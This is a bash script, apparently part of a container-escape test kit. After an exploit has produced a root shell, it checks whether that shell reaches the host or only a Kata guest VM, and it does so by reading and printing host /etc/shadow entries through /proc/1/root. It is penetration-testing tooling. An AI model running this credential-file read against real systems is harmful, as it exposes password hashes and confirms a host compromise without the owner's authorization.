#!/usr/bin/env bash
# verify-escape.sh -- Check whether the container escape reached the host
#
# Run this AFTER the exploit has been executed and a root shell is
# available via 'su'. This script checks whether the root access is
# to the real host or merely to the Kata guest VM.
#
# Usage: su -c 'bash /opt/verify-escape.sh'
#
# WARNING: For authorized security testing only. Do not run on
# production systems.

set -euo pipefail

echo "=== Container Escape Verification ==="
echo ""

# 1. Check our UID
echo "[*] Current UID: $(id -u) ($(id -un))"
echo ""

# 2. Try to read the host's /etc/shadow via /proc/1/root
echo "[*] Attempting to read host /etc/shadow via /proc/1/root..."
if [ -r /proc/1/root/etc/shadow ]; then
    echo "[!] SUCCESS -- can read /proc/1/root/etc/shadow:"
    head -3 /proc/1/root/etc/shadow
    echo "    ..."
else
    echo "[-] Cannot read /proc/1/root/etc/shadow"
fi
echo ""

# 3. Check what kernel /proc/1 sees (host vs guest)
echo "[*] Kernel version from /proc/1's perspective:"
if [ -r /proc/1/root/proc/version ]; then
    cat /proc/1/root/proc/version
else
    echo "    (cannot read)"
fi
echo ""

# 4. Check hostname of PID 1's root
echo "[*] Hostname from /proc/1's root:"
if [ -r /proc/1/root/etc/hostname ]; then
    cat /proc/1/root/etc/hostname
else
    echo "    (cannot read)"
fi
echo ""

# 5. Verdict
echo "=== Verdict ==="
if [ -r /proc/1/root/etc/shadow ]; then
    # Check if it looks like a real host shadow (has root entry with hash)
    if grep -q '^root:\$' /proc/1/root/etc/shadow 2>/dev/null; then
        echo "[!!!] HOST COMPROMISED -- reading real host /etc/shadow"
        echo "      This means the exploit escaped the container to the node."
    else
        echo "[*] CONTAINED -- /etc/shadow readable but appears to be"
        echo "    the Kata guest VM's shadow file, not the host's."
    fi
else
    echo "[*] CONTAINED or FAILED -- cannot read host files."
fi
